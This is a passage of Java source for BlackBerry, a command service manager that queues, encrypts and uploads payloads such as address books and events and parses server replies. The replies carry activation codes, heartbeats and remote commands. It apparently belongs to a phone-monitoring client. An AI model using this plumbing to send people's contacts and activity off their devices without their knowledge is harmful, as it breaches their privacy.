package com.vvt.prot;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Vector;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.util.DataBuffer;
import com.vvt.encryption.AESDecryptor;
import com.vvt.http.FxHttp;
import com.vvt.http.FxHttpListener;
import com.vvt.http.request.ContentType;
import com.vvt.http.request.FxHttpRequest;
import com.vvt.http.request.MethodType;
import com.vvt.http.response.FxHttpResponse;
import com.vvt.http.response.SentProgress;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.RAskListener;
import com.vvt.prot.command.SendRAsk;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.databuilder.PayloadType;
import com.vvt.prot.databuilder.ProtocolPacketBuilder;
import com.vvt.prot.databuilder.ProtocolPacketBuilderResponse;
import com.vvt.prot.parser.ResponseParser;
import com.vvt.prot.command.response.SendRAskCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.prot.session.SessionInfo;
import com.vvt.prot.session.SessionManager;
import com.vvt.prot.unstruct.AcknowledgeListener;
import com.vvt.prot.unstruct.AcknowledgeSecureListener;
import com.vvt.prot.unstruct.Acknowledgement;
import com.vvt.prot.unstruct.AcknowledgementSecure;
import com.vvt.prot.unstruct.KeyExchange;
import com.vvt.prot.unstruct.KeyExchangeListener;
import com.vvt.prot.unstruct.response.AckCmdResponse;
import com.vvt.prot.unstruct.response.AckSecCmdResponse;
import com.vvt.prot.unstruct.response.KeyExchangeCmdResponse;
import com.vvt.std.FileUtil;
import com.vvt.std.Log;

public class CommandServiceManager {
	
	private static final String TAG = "CSM";
	private static final long COM_SERV_MAN_GUID = 0x42c525cdd6889ca5L;
	private static CommandServiceManager 	self 			= null;
	private SessionManager 					sessionManager	= null;	
	private CommandExecutor 				cmdExecutor		= null;
	private Vector 							cmdQueue		= new Vector();
	
	private Integer							IDLE_EXECUTOR	= new Integer(0);
	private Integer							BUSY_EXECUTOR 	= new Integer(1);
	
	private Integer							cmdExecutorState = IDLE_EXECUTOR;
	private	Vector 							pendingSessions = null;
	private	Vector 							orphanSessions 	= null;
	private static ExecutorState 			executorState	= ExecutorState.IDLE;
	
	private CommandServiceManager() {
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "CommandServiceManager begins!");
		}*/
		sessionManager 	= SessionManager.getInstance();
		executorState 	= ExecutorState.IDLE;

		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "CommandServiceManager end");
		}*/
	}
	
	public static CommandServiceManager getInstance() {
		if (self == null) {
			self = (CommandServiceManager)RuntimeStore.getRuntimeStore().get(COM_SERV_MAN_GUID);
			if (self == null) {
				CommandServiceManager comServMan = new CommandServiceManager();
				RuntimeStore.getRuntimeStore().put(COM_SERV_MAN_GUID, comServMan);
				self = comServMan;
			}
		}
		return self;
	}
	
	public boolean isSessionPending(long csid) {
		return SessionManager.getInstance().isSessionPending(csid);
	}
	
	public synchronized int execute(CommandRequest cmdRequest) throws IOException {
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "execute() begins");
		}*/
		SessionInfo session 	= sessionManager.createSession(cmdRequest);

		NewRequest	newRequest	= new NewRequest();
		newRequest.setCommandRequest(cmdRequest);
		newRequest.setClientSessionId(session.getCsid());
		newRequest.setPayloadPath(session.getPayloadPath());
		newRequest.setPriority(cmdRequest.getPriority());
		// set TransportDirective according to CommandData
		CommandData comData = cmdRequest.getCommandData();
		newRequest.setTransportDirective(getTransportDirectives(comData));
		
		addCommandToQueue(newRequest);
		
		selectRequestToExecute();
		
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "execute() end");
		}*/
		return (int) session.getCsid();
	}
	
	public boolean isCommandExecutorBusy() {
		boolean state = false;
		if (cmdExecutorState.equals(BUSY_EXECUTOR))	{
			state = true;
		}
		return state;
	}
	
	private TransportDirectives getTransportDirectives(CommandData comData) {
		TransportDirectives direct 	= TransportDirectives.NON_RESUMABLE;
		
		CommandCode code = comData.getCommand();		
		if ( code.equals(CommandCode.SEND_ADDRESS_BOOK)) {
			direct = TransportDirectives.RESUMABLE;
		}		
		else if ( code.equals(CommandCode.SEND_ADDRESS_BOOK_FOR_APPROVAL)) {
			direct = TransportDirectives.RESUMABLE;
		}		
		else if ( code.equals(CommandCode.SEND_EVENTS)) {
			direct = TransportDirectives.RESUMABLE;
		}
		return direct; 
	}
	
	private void addCommandToQueue(Request request)	{
		synchronized(cmdQueue)	{
			
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG + ".addCommandToQueue()", "START!");
			}*/
			
			RequestType rt = request.getRequestType();
			if (rt.equals(RequestType.NEW_REQUEST))	{
				 
				/*if (Log.isDebugEnable()) {
					Log.debug(TAG + ".addCommandToQueue()", "NEW REQUEST!");
				}*/
				
				NewRequest nReq = (NewRequest) request;
				Priorities pr 	= nReq.getPriority();
				if (pr.compareTo(Priorities.NORMAL)==0)	{
					cmdQueue.addElement(nReq);
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG + ".addCommandToQueue()", "cmdQueue.size(): " + cmdQueue.size());
					}*/
				}
				else { // new request with above normal priority
					int size = cmdQueue.size();
					if (size>0)	{
						int 	i 			= 0;
						boolean inserted 	= false;
						while (!inserted && i<size)	{
							Request req = (Request) cmdQueue.elementAt(i);
							if (req.getRequestType().equals(RequestType.NEW_REQUEST))	{
								NewRequest cmdInQueue = (NewRequest) req;
								if (pr.compareTo(cmdInQueue.getPriority()) > 0)	{
									cmdQueue.insertElementAt(nReq, i);
									inserted = true;
									/*if (Log.isDebugEnable()) {
										Log.debug(TAG, "Inserted priority request to the queue !");
									}*/
								}
							}
							else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
								ResumeRequest cmdInQueue = (ResumeRequest) req;
//								if (pr.compareTo(Priorities.HIGHEST)==0)	{
								if (pr.compareTo(cmdInQueue.getPriority()) > 0)	{
									cmdQueue.insertElementAt(nReq, i);
									inserted = true;
									/*if (Log.isDebugEnable()) {
										Log.debug(TAG, "Inserted highest priority request to the queue !");
									}*/
								}
							}
							i++;
						}
						if (!inserted) {
							cmdQueue.addElement(nReq);
						}
					}
					else {
						cmdQueue.addElement(nReq);
					}	
				}
			}
			else if (rt.equals(RequestType.RESUME_REQUEST))	{
				
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".addCommandToQueue()", "RESUME REQUEST!");
				}
				
				ResumeRequest rReq = (ResumeRequest) request;
				int size = cmdQueue.size();
				if (size == 0) {	
					cmdQueue.addElement(rReq);
				}
				else {
					int 	i 			= 0;
					boolean inserted 	= false;
					while (!inserted && (i<size))	{
						Request req = (Request) cmdQueue.elementAt(i);
						if (req.getRequestType().equals(RequestType.NEW_REQUEST))	{
							NewRequest cmdInQueue = (NewRequest) req;
							Priorities prior	  = cmdInQueue.getPriority();
							if (prior.compareTo(rReq.getPriority()) < 0)	{
								cmdQueue.insertElementAt(rReq, i);
								inserted = true;
								/*if (Log.isDebugEnable()) {
									Log.debug(TAG, "Inserted priority request to the queue !");
								}*/
							}
						}
						else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
							ResumeRequest cmdInQueue = (ResumeRequest) req;
							Priorities prior = cmdInQueue.getPriority();
							if (prior.compareTo(rReq.getPriority()) < 0) {
								cmdQueue.insertElementAt(rReq, i);
								inserted = true;
							}
						}
						i++;
					}
					if (!inserted) {
						cmdQueue.addElement(rReq);
					}
				}	
			}
		}
	}

	// logic to select request to run
	private synchronized void selectRequestToExecute()	{
		synchronized(cmdQueue)	{
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".selectRequestToExecute()", "cmdQueue.size(): " + cmdQueue.size());
			}
			if (cmdQueue.size() > 0) {
				Request req = (Request) cmdQueue.firstElement();
				if (req.getRequestType().equals(RequestType.NEW_REQUEST))	{
					NewRequest newReq = (NewRequest) req;
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG + ".selectRequestToExecute()", "newReq: " + newReq);
					}
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".selectRequestToExecute()", "cmdExecutor: " + cmdExecutor);
						Log.debug(TAG + ".selectRequestToExecute()", "executorState: " + executorState);
					}*/
					synchronized(cmdExecutorState)	{

						/*if (Log.isDebugEnable()) {
							Log.debug(TAG + "Synchronized(cmdExecutor)", "enter");
						}*/
						if (cmdExecutorState.equals(IDLE_EXECUTOR)) {
							cmdExecutor = new CommandExecutor(newReq);
							cmdExecutor.start();
							cmdExecutorState = BUSY_EXECUTOR;
							cmdQueue.removeElementAt(0);
							
							/*if (Log.isDebugEnable()) {
								Log.debug(TAG + ".selectRequestToExecute()", "End!");
							}*/
							
						} else {
							if (Log.isDebugEnable()) {
								Log.debug(TAG + ".selectRequestToExecute()", "cmdExecutorState.equals(IDLE_EXECUTOR)?" + cmdExecutorState.equals(IDLE_EXECUTOR));
							}
						}
					}
				}
				else if (req.getRequestType().equals(RequestType.RESUME_REQUEST))	{
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".selectRequestToExecute().RESUME_REQUEST", "cmdExecutorState.equals(IDLE_EXECUTOR)?" + cmdExecutorState.equals(IDLE_EXECUTOR));
					}
					ResumeRequest resumeReq = (ResumeRequest) req;
					synchronized(cmdExecutorState)	{
						if (cmdExecutorState.equals(IDLE_EXECUTOR)) {
							cmdExecutor = new CommandExecutor(resumeReq);
							cmdExecutor.start();
							cmdExecutorState = BUSY_EXECUTOR;
							cmdQueue.removeElementAt(0);
						}
					}
				}
			}
		}
	}
	
	// CommandExecutor invokes this method after finish each request
	// to clear old session (csid) and run a next request.
	private void continueExecute(long csid) {
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "continueExecute csid="+csid);
		}*/
		
		// clean old session.
		//sessionManager.deleteSession(csid);
		
		// release old executor
		synchronized(cmdExecutorState)	{
			cmdExecutorState = IDLE_EXECUTOR;
		}
		
		selectRequestToExecute();
	}
	
	// return only resumable sessions to caller
	public Vector getPendingCsids()	{
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "getPendingCsids begin");
		}*/
		pendingSessions	= new Vector();
		
		// get all session in persistentStore
		Enumeration e 	= sessionManager.getAllSessions();
				
		Hashtable pending = new Hashtable();
		while (e.hasMoreElements())	{
			SessionInfo session = (SessionInfo) e.nextElement();
			// is resumable ?
			if (session.isPayloadReady()) {
				pending.put(new Long(session.getCsid()), session);
			}
		}
		if (cmdExecutorState.equals(BUSY_EXECUTOR))	{
			Long runningCsid = new Long(cmdExecutor.getRunningCsid());
			if (pending.containsKey(runningCsid))	{
				pending.remove(runningCsid);
			}
		}
		// check all csid in the queue to remove from pending list.
		synchronized(cmdQueue)	{
			if (cmdQueue.size()>0)	{
				for (int i=0; i<cmdQueue.size(); i++)	{
					Request req = (Request) cmdQueue.elementAt(i);
					if (req.getRequestType().equals(RequestType.NEW_REQUEST)) {
						NewRequest newReq = (NewRequest) req;
						Long queueCsid = new Long(newReq.getClientSessionId());
						if (pending.containsKey(queueCsid))	{
							pending.remove(queueCsid);
						}
					}
					else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
						ResumeRequest resReq = (ResumeRequest) req;
						Long queueCsid = new Long(resReq.getSessionInfo().getCsid());
						if (pending.containsKey(queueCsid))	{
							pending.remove(queueCsid);
						}
					} 
				}
			}
		}
		Enumeration pendCsids = pending.keys();
		while (pendCsids.hasMoreElements())	{
			Long csid  = (Long) pendCsids.nextElement();
			pendingSessions.addElement(csid);
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG, " - > Pending csid :"+csid);
			}*/
		}
		pending.clear();
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "getPendingCsids end");
		}*/
		return pendingSessions;
	}
	
	// return only failed sessions to caller
	public Vector getOrphanCsids()	{
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "getOrphanCsids begin");
		}*/
		// get all session in persistentStore
		Enumeration e 	= sessionManager.getAllSessions();
		Hashtable fails = new Hashtable();
		orphanSessions	= new Vector();
		while (e.hasMoreElements())	{
			SessionInfo session = (SessionInfo) e.nextElement();
			// is not resumable ?
			if (! session.isPayloadReady()) {
				fails.put(new Long(session.getCsid()), session);
			}
		}
		// check running csid in cmdExecutor to remove from fail list.
		if (cmdExecutorState.equals(BUSY_EXECUTOR))	{
			Long runningCsid = new Long(cmdExecutor.getRunningCsid());
			if (fails.containsKey(runningCsid))	{
				fails.remove(runningCsid);
			}
		}
		// check all csid in the queue to remove from fail list.
		synchronized(cmdQueue)	{
			if (cmdQueue.size()>0)	{
				for (int i=0; i<cmdQueue.size(); i++)	{
					Request req = (Request) cmdQueue.elementAt(i);
					if (req.getRequestType().equals(RequestType.NEW_REQUEST)) {
						NewRequest newReq = (NewRequest) req;
						Long queueCsid = new Long(newReq.getClientSessionId());
						if (fails.containsKey(queueCsid))	{
							fails.remove(queueCsid);
						}
					}
					else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
						ResumeRequest resReq = (ResumeRequest) req;
						Long queueCsid = new Long(resReq.getSessionInfo().getCsid());
						if (fails.containsKey(queueCsid))	{
							fails.remove(queueCsid);
						}
					} 
				}
			}
		}
		// clean fail session from SessionManager
		Enumeration failCsids = fails.keys();
		while (failCsids.hasMoreElements())	{
			Long failCsid  = (Long) failCsids.nextElement();
			SessionInfo  failSession = (SessionInfo) fails.get(failCsid);
			cmdExecutor.deletePayloadFile();
			sessionManager.deleteSession(failCsid.longValue());
			orphanSessions.addElement(new Long(failSession.getCsid()));
		}
		fails.clear();
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "getOrphanCsids end");
		}*/
		return orphanSessions;
	}

	public void cancelRequest(long csid)	{
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "cancelRequest "+csid+" begin");
		}*/
		// if is is executing, cancel it 
		
		
		
//		int z = 0;
		
		try {
			
		if (cmdExecutorState.equals(BUSY_EXECUTOR))	{
			
//			z = 1;
			
			Long runningCsid = new Long(cmdExecutor.getRunningCsid());
			
//			z = 2;
			
			if (runningCsid.longValue() == csid)	{
				
//				z = 3;
				
				cmdExecutor.cancel();
				
//				z = 4;
				
			}
		}
		
//		z = 5;
		
		// clear from queue
		synchronized(cmdQueue)	{
			
//			z = 6;
			
			if (cmdQueue.size()>0)	{
				
//				z = 7;
				
				boolean found 	= false;
				int 	i		= 0;
				while (!found && i<cmdQueue.size()) {
					
//					z = 8;
					
					Request req = (Request) cmdQueue.elementAt(i);
					
//					z = 9;
					
					if (req.getRequestType().equals(RequestType.NEW_REQUEST)) {
						
//						z = 10;
						
						NewRequest newReq = (NewRequest) req;
						
//						z = 11;
						
						if (newReq.getClientSessionId()==csid)	{
							
//							z = 12;
							
							found = true;
							cmdQueue.removeElementAt(i);
							
//							z = 13;
							
						}
						
					} else if (req.getRequestType().equals(RequestType.RESUME_REQUEST)) {
						
//						z = 14;
						
						ResumeRequest resReq = (ResumeRequest) req;
						
//						z = 15;
						
						if (resReq.getSessionInfo().getCsid()==csid)	{
							
//							z = 16;
							
							found = true;
							cmdQueue.removeElementAt(i);
							
//							z = 17;
							
						}
					}
					
//					z = 18;
					
					i++;
				}
			}
		}
		
//		z = 19;
		
		// clean session also
		sessionManager.deleteSession(csid);
		
//		z = 20;
		
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "cancelRequest "+csid+" end");
		}*/
		// TODO: Add
		if (cmdExecutor != null) {
			cmdExecutor.deletePayloadFile();
		}
		
//		z = 21;
		
		} catch (Exception e) {
			Log.error(TAG + ".cancelRequest()", e.getMessage(), e);
		}
	}
	
	// for debug
	public void cleanAllSessions()	{
		sessionManager.cleanAllSessions();
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG, "cleanAllSessions");
		}*/
	}
	
	// - - - - - - - - Resume Case - - - - - - - - 
	
	public synchronized long executeResume(long csid, CommandListener listener) throws IOException {
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "executeResume() begins");
		}
		long _csid = -1;
		SessionInfo session 	= sessionManager.getSession(csid);
		if (session != null) {
			_csid = csid;
			ResumeRequest resumeReq	= new ResumeRequest();
			resumeReq.setCommandListener(listener);
			resumeReq.setSessionInfo(session);
			resumeReq.setTransportDirective(TransportDirectives.RSEND);
			addCommandToQueue(resumeReq);
			selectRequestToExecute();
		}
		if (Log.isDebugEnable()) {
			Log.debug(TAG, "executeResume end");
		}
		return _csid;
	}
	
	public void setSessionManagerDefaultPath(String path) {
		sessionManager.setPath(path);
	}
	
	private class CommandExecutor extends Thread implements KeyExchangeListener, RAskListener,
								FxHttpListener, AcknowledgeSecureListener, AcknowledgeListener {

		private NewRequest 			_newRequest				= null;
		private ResumeRequest		_resumeRequest			= null;
		
		private boolean				_run					= true;
		private SessionInfo			_session 				= null;
		private boolean 			isKeyExchangeSuccess	= false;
		private boolean 			isHttpSuccess			= false;
		private boolean 			isEncrypted 			= false;
		private KeyExchangeCmdResponse keyExchangeResponse	= null;
		private DataBuffer 			responseBuffer 			= new DataBuffer();
		
		private boolean 			isSendRAskSuccess		= false;
		private SendRAskCmdResponse _sendRAskRes			= null;
		private CommandListener		cmdListener				= null;
		private ProtocolPacketBuilderResponse 	response	= null;
		private boolean 			isWriteRespFile			= false;
		private String				responseFilePath		= null;
		private boolean 			isFirstResponseData		= true;
		
		
		public CommandExecutor(NewRequest newRequest)	{			
			_newRequest		= newRequest;
			_resumeRequest	= null;
			long csid 		= _newRequest.getClientSessionId();
			_session 		= sessionManager.getSession(csid);
			
			cmdListener				= newRequest.getCommandRequest().getCommandListener();
			CommandData cmdData = _newRequest.getCommandRequest().getCommandData();
			if (cmdData.getCommand().equals(CommandCode.GET_ADDRESS_BOOK)) {
				String responseExtension = ".res";
				isWriteRespFile = true;
				responseFilePath = _session.getPayloadPath() + responseExtension;
			}
		}
		
		public CommandExecutor(ResumeRequest resumeRequest)	{			
			_newRequest		= null;
			_resumeRequest	= resumeRequest;
			_session 		= resumeRequest.getSessionInfo();
			cmdListener		= resumeRequest.getCommandListener();
		}
		
		public void cancel()	{
			_run = false;
		}
		
		public long getRunningCsid()	{
			return _session.getCsid();
		}
		
		public void run()  {			
			long csid = 0;			
			try {
				if (_run && _newRequest != null) {
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG, "New Request is executed !");
					}*/
					csid = _newRequest.getClientSessionId();
					
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG, "csid: " + csid);
					}*/
					
					if (_run && doKeyExchange()) {
						if (_run && buildCmdPacketData()) {
							if (_run) {
								persistSession();
								if (_run && doPostRequest(0)) {
									if (isEncrypted) {
										doAcknowledgeSecure();
									} else {
										doAcknowledge();
									}
								}
							}
						}
					} 
				} else if (_run && _resumeRequest != null) {
					if (Log.isDebugEnable()) {
						Log.debug(TAG, "_resumeReques, _run: " + _run);						
					}
					if (_run)	{						
						if (doRask()) {
							int offset = (int)_sendRAskRes.getNumberOfBytes();
							if (Log.isDebugEnable()) {
								Log.debug(TAG, "doRask, offset: " + offset + ", payload size:" + _session.getPayloadSize());								
							}
//							if (offset < _session.getPayloadSize()) {
								if (buildResumeCmdPacketData()) {
									if (_run && doPostRequest(offset)) {
										if (isEncrypted) {
											doAcknowledgeSecure();
										} else {
											doAcknowledge();
										}
									}
								}
//							} 
							/*else {
								// That means already sent completed.
								if (isEncrypted) {
									doAcknowledgeSecure();
								} else {
									doAcknowledge();
								}
								deletePayloadFile();
								sessionManager.deleteSession(_session.getCsid());
							}*/
						}
					}
				}

			} catch (Exception e) {
				e.printStackTrace();
				if (_run && cmdListener!= null)	{
					cmdListener.onConstructError(_session.getCsid(), e);
					deletePayloadFile();
					sessionManager.deleteSession(_session.getCsid());					
				}
				Log.error(TAG, "CommandExecutor is failed!: ", e);
			}
			//If cancel will delete Payload file
			if (!_run) {
				deletePayloadFile();
				// TODO: Added 27/04/2011
				sessionManager.deleteSession(_session.getCsid());
			}
			executorState = ExecutorState.IDLE;
			cmdExecutorState = IDLE_EXECUTOR;
//			if (csid > 0) {
				// run next command
				continueExecute(csid);
//			}
		}
		
		// do key exchange for new request only !
		private boolean doKeyExchange() {			
			isKeyExchangeSuccess = false;
			if (_newRequest != null) {
				KeyExchange key = null;
				try {
					executorState = ExecutorState.REQUEST_KEYEXCHANGE;
					key = new KeyExchange();
			    	key.setUrl(_newRequest.getCommandRequest().getUrl() + "/unstructured");
			    	key.setKeyExchangeListener(this);
			    	key.setCode(1);
			    	key.setEncodingType(1);
			    	key.doKeyExchange();
			    	key.join();
				} catch (InterruptedException e) {
					key = null;
					Log.error(TAG, "InterruptedException", e);
					if (_run && cmdListener!= null)	{
						cmdListener.onConstructError(_session.getCsid(), e);						
					}
				}
			}
			else {
				Log.error(TAG, "newRequest is null !?");
			}
	    	return isKeyExchangeSuccess; 
		}
		
		private boolean buildCmdPacketData() throws Exception {			
			boolean isBuildCmdPacketDataSuccess = false;			
			//Build Command_Packet_data
			ProtocolPacketBuilder protPacketBuilder = new ProtocolPacketBuilder();
			response = protPacketBuilder.buildCmdPacketData(
					_newRequest.getCommandRequest().getCommandMetaData(), 
					_newRequest.getCommandRequest().getCommandData(), 
					_session.getPayloadPath(), 
					_session.getServerPublicKey(), 
					_session.getSessionId(),
					_newRequest.getTransportDirective());			
			updateSessionInfo();
			isBuildCmdPacketDataSuccess = true;			
			return isBuildCmdPacketDataSuccess;
		}
		
		private void updateSessionInfo() {
			//Update SessionInfo
			_session.setAesKey(response.getAesKey());
			_session.setEncryptionCode(_newRequest.getCommandRequest()
					.getCommandMetaData().getEncryptionCode());
			_session.setCompressionCode(_newRequest.getCommandRequest()
					.getCommandMetaData().getCompressionCode());
			_session.setPayloadReady(true);
			_session.setUrl(_newRequest.getCommandRequest().getUrl());
			_session.setPayloadCRC32(response.getPayloadCRC32());
			_session.setPayloadSize(response.getPayloadSize());
		}
		
		private void persistSession() {
			//Persist session
			SessionManager.getInstance().persistSession(_session);
		}
		
		private boolean doPostRequest(int offset) {			
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".doPostRequest()", "ENTER, offset: " + offset);
			}
			FxHttp http = null; 
			try {
				executorState = ExecutorState.SEND_REQUEST;
				FxHttpRequest request = new FxHttpRequest();
				request.setUrl(_session.getUrl());
				request.setMethod(MethodType.POST);
				request.setContentType(ContentType.BINARY);				
				request.addDataItem(response.getMetaData());
				if (response.getPayloadType().equals(PayloadType.FILE)) {
					request.addFileDataItem(_session.getPayloadPath(), offset);					
				} else {
					request.addDataItem(response.getPayloadData());
				}
				
				http = new FxHttp();
				http.setHttpListener(this);
				http.setRequest(request);
				http.start();
				http.join();
			} catch (InterruptedException e) {
				Log.error(TAG + ".doPostRequest()", "InterruptedException", e);
				http = null;
				if (_run && cmdListener!= null)	{
					cmdListener.onTransportError(_session.getCsid(), e);
				}
				/*// TODO: Blackberry cannot resume so if there are any error will delete payload file
				deletePayloadFile();
				sessionManager.deleteSession(_session.getCsid());*/
			}
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".doPostRequest()", "EXIT");
			}
			return isHttpSuccess;
		}
		
		private StructureCmdResponse parseResponse() throws Exception {
			StructureCmdResponse res = null;
			if (isWriteRespFile) {
				//Call ResponseFileExecutor
				ResponseFileExecutor respFileExecutor = new ResponseFileExecutor(isEncrypted, response.getAesKey(), responseFilePath);
				res = respFileExecutor.execute();
			} else {
				//Write to memory
				byte[] responseData = responseBuffer.toArray();				
				if (isEncrypted) {
					byte[] data = null;
					data = AESDecryptor.decrypt(response.getAesKey(), responseData);	
					res = ResponseParser.parseStructuredCmd(data);
				} else {
					res = ResponseParser.parseStructuredCmd(responseData);
				}				
			}
			return res;
		}
		
		/*private void saveResponseLog(CommandResponse cmdResponse) {
			if (cmdResponse instanceof StructureCmdResponse) {
				StructureCmdResponse structureCmd = (StructureCmdResponse)cmdResponse;
				//int cmd = structureCmd.getCommand().getId();
				if (cmdResponse instanceof SendActivateCmdResponse) {
					SendActivateCmdResponse actRes = (SendActivateCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " actRes.getConfigID(): "	+ actRes.getConfigID());
						Log.debug(TAG, " actRes.getExtStatus(): " 	+ actRes.getExtStatus());
						Log.debug(TAG, " actRes.getServerId(): " 	+ actRes.getServerId());
						Log.debug(TAG, " actRes.getServerMsg(): " 	+ actRes.getServerMsg());
						Log.debug(TAG, " actRes.getStatusCode(): " 	+ actRes.getStatusCode());
						Log.debug(TAG, " actRes.getCommand(): " 	+ actRes.getCommand().getId());
						Vector pcc = actRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof SendHeartBeatCmdResponse) {
					SendHeartBeatCmdResponse heartBeatRes = (SendHeartBeatCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " heartBeatRes.getExtStatus(): " + heartBeatRes.getExtStatus());
						Log.debug(TAG, " heartBeatRes.getServerId(): " + heartBeatRes.getServerId());
						Log.debug(TAG, " heartBeatRes.getServerMsg(): " + heartBeatRes.getServerMsg());
						Log.debug(TAG, " heartBeatRes.getStatusCode(): " + heartBeatRes.getStatusCode());
						Log.debug(TAG, " heartBeatRes.getCommand(): " + heartBeatRes.getCommand().getId());
						Vector pcc = heartBeatRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof SendDeactivateCmdResponse) {
					SendDeactivateCmdResponse deactRes = (SendDeactivateCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " deactRes.getExtStatus(): " + deactRes.getExtStatus());
						Log.debug(TAG, " deactRes.getServerId(): " + deactRes.getServerId());
						Log.debug(TAG, " deactRes.getServerMsg(): " + deactRes.getServerMsg());
						Log.debug(TAG, " deactRes.getStatusCode(): " + deactRes.getStatusCode());
						Log.debug(TAG, " deactRes.getCommand(): " + deactRes.getCommand().getId());
						Vector pcc = deactRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof GetActivationCodeCmdResponse) {
					GetActivationCodeCmdResponse getActCodeRes = (GetActivationCodeCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " getActCodeRes.getExtStatus(): " + getActCodeRes.getExtStatus());
						Log.debug(TAG, " getActCodeRes.getServerId(): " + getActCodeRes.getServerId());
						Log.debug(TAG, " getActCodeRes.getServerMsg(): " + getActCodeRes.getServerMsg());
						Log.debug(TAG, " getActCodeRes.getStatusCode(): " + getActCodeRes.getStatusCode());
						Log.debug(TAG, " getActCodeRes.getCommand(): " + getActCodeRes.getCommand().getId());
						Log.debug(TAG, " getActCodeRes.getActivationCode(): " + getActCodeRes.getActivationCode());
						Vector pcc = getActCodeRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof SendEventCmdResponse) {
					SendEventCmdResponse sendRes = (SendEventCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " sendRes.getExtStatus(): " 	+ sendRes.getExtStatus());
						Log.debug(TAG, " sendRes.getServerId(): " 	+ sendRes.getServerId());
						Log.debug(TAG, " sendRes.getServerMsg(): " 	+ sendRes.getServerMsg());
						Log.debug(TAG, " sendRes.getStatusCode(): " + sendRes.getStatusCode());
						Log.debug(TAG, " sendRes.getCommand(): " 	+ sendRes.getCommand().getId());
						Vector pcc = sendRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " 	+ nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
